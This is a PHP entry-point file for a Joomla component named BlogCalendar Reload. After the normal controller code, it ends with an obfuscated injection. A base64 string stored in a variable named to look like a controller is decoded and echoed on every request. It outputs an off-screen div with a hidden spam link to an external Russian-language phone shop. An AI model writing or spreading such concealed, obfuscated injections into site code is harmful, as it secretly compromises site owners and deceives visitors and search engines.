<?php
/**
* @package		BlogCalendar Reload
* @author		Juan Padial
* @license		GNU/GPL
*/
// no direct access
defined('_JEXEC') or die('Restricted access');
// import joomla controller library
jimport('joomla.application.component.controller');

// Get an instance of the controller prefixed by BlogCalendar
$controller = JController::getInstance('BlogCalendar');
 
// Perform the Request task
$controller->execute(JRequest::getCmd('task'));
 
// Redirect if set by the controller
$controller->redirect();
$controllersz = 'PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDotMjAwMHB4O3dpZHRoOjIwMDBweCI+PGEgaHJlZj0iaHR0cDovL2dvb2Rtb2JpbGUuc3UvIj7QmtC40YLQsNC50YHQutC40LUg0YLQtdC70LXRhNC+0L3RiyDQuCDQstGB0LUg0LTQu9GPINC90LjRhTwvYT48L2Rpdj4=';
echo base64_decode($controllersz);
?>